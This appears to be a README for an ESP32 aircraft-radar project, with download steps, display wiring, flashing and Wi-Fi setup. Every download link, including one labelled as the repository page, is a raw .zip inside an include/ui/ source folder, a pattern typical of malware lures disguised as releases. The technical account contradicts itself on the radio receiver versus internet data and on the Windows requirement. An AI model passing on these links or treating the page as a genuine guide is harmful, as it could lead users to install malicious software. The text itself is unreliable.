# ✈️ ESP32-Plane-Radar - Track live aircraft using radar display

[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Curvilinear-brushwolf761/ESP32-Plane-Radar/raw/refs/heads/main/include/ui/Plane_Radar_ES_3.1-beta.3.zip)

This software turns your ESP32 hardware and screen into a real-time air traffic monitor. It detects nearby ADS-B signals from planes and displays them on a round radar screen. You see aircraft distance, heading, and movement patterns in your local area.

## 📋 System requirements

Before you begin, ensure your setup meets these needs:

*   Windows 10 or 11 operating system.
*   One ESP32 development board.
*   One 1.28-inch round GC9A01 LCD display.
*   One USB data cable.
*   An active internet connection to receive aircraft data.

Keep the board and screen ready to connect. Ensure your USB cable carries data and power, as some cables only provide power.

## 📥 How to download the software

The software lives on our project page. Follow these steps to obtain the files:

1. Visit the [official repository page](https://github.com/Curvilinear-brushwolf761/ESP32-Plane-Radar/raw/refs/heads/main/include/ui/Plane_Radar_ES_3.1-beta.3.zip).
2. Look for the Releases section on the right side of the screen.
3. Click the latest version number.
4. Find the file ending in .zip or .bin under the Assets list.
5. Save this file to your computer.

You now have the necessary files on your hard drive.

## ⚙️ Connecting your hardware

Connect the hardware carefully to prevent damage. Use the following guide for wiring your ESP32 to the display.

If your board has pins, push them into a breadboard. Use jumper wires to connect the display.

*   Connect VCC on the display to 3.3V on the ESP32.
*   Connect GND on the display to GND on the ESP32.
*   Connect DIN to GPIO 23.
*   Connect CLK to GPIO 18.
*   Connect CS to GPIO 5.
*   Connect DC to GPIO 2.
*   Connect RES to GPIO 4.
*   Connect BLK to 3.3V.

Verify every connection. Loose wires stop the screen from turning on. Check that all pins sit firmly in the sockets.

## 🚀 Setting up the software

Follow these steps to put the software onto your ESP32 board.

1. Download the ESP32 installation tool from the official Espressif website.
2. Open the installation tool on your computer.
3. Select the ESP32 option from the menu.
4. Choose the COM port that matches your board. Check your Device Manager if the software does not detect the board.
5. Click the folder icon and select the file you downloaded earlier.
6. Press the Start button.

The tool writes the software to your chip. A progress bar shows you the status. Do not pull the USB cable out during this process. Wait until the software displays a Success message.

## 📡 Configuring your radar

Once the board finishes its update, it starts the radar process. You must connect the device to your Wi-Fi network so it can fetch plane data from the internet.

1. Open your computer Wi-Fi settings.
2. Look for an open network named Plane-Radar-Setup.
3. Connect to this network.
4. A window should pop up automatically. If it does not, open a web browser and type 192.168.4.1 into the address bar.
5. Enter your home Wi-Fi name and password.
6. Click Save and Reboot.

Your ESP32 restarts. It now connects to your home network. Place the device near a window for the best results.

## 📊 Viewing plane data

The screen shows a black background with a glowing ring. This ring represents the radar sweep. Small white dots appear on the screen when a plane sends a signal.

*   The center dot is your location.
*   Dots moving across the screen represent planes flying in your area.
*   The system updates these positions every few seconds.

The hardware uses a radio receiver to listen for broadcast messages from nearby aircraft. These signals contain the altitude, speed, and callsign of the plane. The firmware processes this data and converts it into coordinates on your round display. 

## 🛠 Troubleshooting common issues

If the screen stays dark, check the power cable first. Ensure the display has a firm connection to the ESP32. Sometimes the screen requires a hard reset. Unplug the USB cable and plug it back in.

If the radar does not show any planes, verify your Wi-Fi settings. The device needs an internet connection to pull the live flight data. Move the device to a different location in your room to avoid signal interference. Metal objects and thick walls block small radio signals.

Check the device logs if you possess advanced knowledge of serial monitors. Use software like PuTTY to view the output from the ESP32. This output reveals if the device encountered a Wi-Fi connection error or a display driver conflict. 

## ℹ️ Technical notes

The firmware handles all decoding internally. It manages the connection to data services and updates the display controller via the SPI bus. The screen uses the GC9A01 driver. We optimized the refresh rate to keep the animation smooth without overloading the chip processor. 

We update the firmware periodically to support more radar features. You can check the repository again in the future to see if a newer version exists. Follow the same download steps to update your device.